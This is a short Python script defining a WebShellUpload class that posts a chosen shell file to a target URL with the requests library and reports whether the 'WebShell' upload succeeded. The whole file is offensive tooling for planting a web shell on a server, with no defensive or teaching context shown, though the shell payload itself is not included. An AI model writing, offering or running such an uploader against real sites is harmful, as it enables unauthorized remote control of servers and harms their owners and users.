import requests

class WebShellUpload:
    def __init__(self, target_url, shell_path):
        self.target_url = target_url
        self.shell_path = shell_path

    def upload_shell(self):
        files = {'file': open(self.shell_path, 'rb')}
        try:
            response = requests.post(self.target_url, files=files)
            if response.status_code == 200:
                print("WebShell uploaded successfully!")
            else:
                print(f"Failed to upload WebShell, status code: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error during WebShell upload: {e}")
